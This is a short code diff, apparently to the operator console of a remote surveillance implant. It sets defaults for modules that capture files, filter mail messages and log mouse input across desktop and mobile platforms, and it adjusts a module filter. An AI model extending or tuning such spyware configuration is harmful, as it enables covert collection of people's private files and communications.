@@ -70,6 +70,8 @@ package it.ht.rcs.console
         
         {
           module: "crisis",
+          network: {enabled: false, processes: []},
+          hook: {enabled: true, processes: []},
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -82,6 +84,13 @@ package it.ht.rcs.console
         
         {
           module: "file",
+          open: false,
+          capture: false,
+          minsize: 1,
+          maxsize: 500000,
+          date: "2011-05-26 09:04:14",
+          accept: [],
+          deny: [],
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -100,6 +109,7 @@ package it.ht.rcs.console
         
         {
           module: "messages",
+          mail: {filter: {maxsize: 0, datefrom: "2011-05-26 09:04:14", dateto: ''}},
           _type: "desktop,mobile",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
@@ -112,7 +122,7 @@ package it.ht.rcs.console
         
         {
           module: "mouse",
-          _type: "desktop,mobile",
+          _type: "desktop",
           _platform: "windows,osx,ios,blackberry,winmo,symbian,android"
         },
         
@@ -163,8 +173,8 @@ package it.ht.rcs.console
     
     private static function moduleFilterFunction(item:Object):Boolean
     {
-      //return item._type.indexOf(agent.type) != -1 && item._platform.indexOf(agent.platform) != -1;
-      return true;
+      return item._type.indexOf(agent.type) != -1;
+      //return true;
     }
     
     private static function getGlobals():Object
